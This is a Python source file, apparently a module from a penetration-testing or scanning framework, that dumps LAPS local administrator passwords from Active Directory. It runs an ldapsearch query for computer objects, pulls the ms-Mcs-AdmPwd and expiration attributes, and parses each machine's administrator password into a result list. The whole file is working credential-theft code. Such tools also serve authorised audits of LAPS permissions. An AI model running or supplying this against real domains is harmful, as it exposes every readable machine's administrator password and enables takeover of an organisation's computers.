"""
LAPS Password Dump Module

Dumps LAPS (Local Administrator Password Solution) passwords
"""

import time
import re
from typing import Dict, Any
from ....proto import ScanOptions, DirectoryType
from utils.async_subprocess import run_exec


class LAPSPasswordDumper:
    """Dumps LAPS passwords"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def dump(self, scan_options: ScanOptions, directory_type: DirectoryType) -> Dict[str, Any]:
        """
        Dumps LAPS passwords from domain
        
        Args:
            scan_options: Scan parameters
            directory_type: Directory type
            
        Returns:
            Dict[str, Any]: Dump results
        """
        result = {
            "success": False,
            "laps_passwords": [],
            "errors": [],
            "statistics": {
                "execution_time": 0
            }
        }
        
        start_time = time.time()
        
        if directory_type != DirectoryType.ACTIVE_DIRECTORY:
            result["errors"].append("LAPS is only available for Active Directory")
            return result
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not scan_options.ldap_server:
            result["errors"].append("LDAP server not specified")
            return result
        
        try:
            base_dn = f"dc={',dc='.join(scan_options.domain_name.split('.'))}"
            
            # Query for computers with LAPS passwords (ms-Mcs-AdmPwd attribute)
            ldapsearch_cmd = [
                'ldapsearch', '-x', '-h', scan_options.ldap_server,
                '-b', base_dn,
                '(objectClass=computer)',
                'sAMAccountName', 'ms-Mcs-AdmPwd', 'ms-Mcs-AdmPwdExpirationTime', 'dNSHostName'
            ]
            
            if scan_options.username and scan_options.password:
                ldapsearch_cmd.extend(['-D', scan_options.username, '-w', scan_options.password])
            
            rc, out, err = await run_exec(ldapsearch_cmd, timeout=60)
            
            if rc == 0:
                laps_passwords = []
                entries = (out or "").split('\n\n')
                
                for entry in entries:
                    if not entry.strip():
                        continue
                    
                    try:
                        sam_match = re.search(r'sAMAccountName:\s*(.*?)$', entry, re.MULTILINE)
                        password_match = re.search(r'ms-Mcs-AdmPwd:\s*(.*?)$', entry, re.MULTILINE)
                        expiration_match = re.search(r'ms-Mcs-AdmPwdExpirationTime:\s*(.*?)$', entry, re.MULTILINE)
                        dns_match = re.search(r'dNSHostName:\s*(.*?)$', entry, re.MULTILINE)
                        
                        if sam_match and password_match:
                            laps_passwords.append({
                                "computer": sam_match.group(1).strip().replace('$', ''),
                                "password": password_match.group(1).strip(),
                                "expiration": expiration_match.group(1).strip() if expiration_match else None,
                                "dns_hostname": dns_match.group(1).strip() if dns_match else None
                            })
                    except Exception:
                        pass
                
                result["laps_passwords"] = laps_passwords
                result["success"] = True
            else:
                result["errors"].append(f"Failed to query LAPS passwords: {err}")
        
        except Exception as e:
            result["errors"].append(f"Error during LAPS password dump: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

